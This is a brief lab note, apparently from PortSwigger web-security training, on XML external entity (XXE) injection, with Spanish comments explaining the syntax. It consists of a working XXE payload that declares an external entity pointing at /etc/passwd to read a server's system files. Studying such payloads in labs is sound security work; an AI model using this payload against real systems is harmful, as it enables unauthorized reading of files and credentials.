# Lab 1 XXE using external entities to retrieve files 

Tags: #XXE #PortSwigger 

```xml
<?xml version="1.0" encoding="UTF-8"?>
	<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc/passwd">]>      
	<root>
		&myFile;
	</root>

	<!-- Colocamos la ruta abosluta del archivo, lleva dos // mas porque es similar al http:// = file://   -->
	<!-- SYSTEM = Cargar una entidad externa, como si fuera una URL de un servidor externo-->
```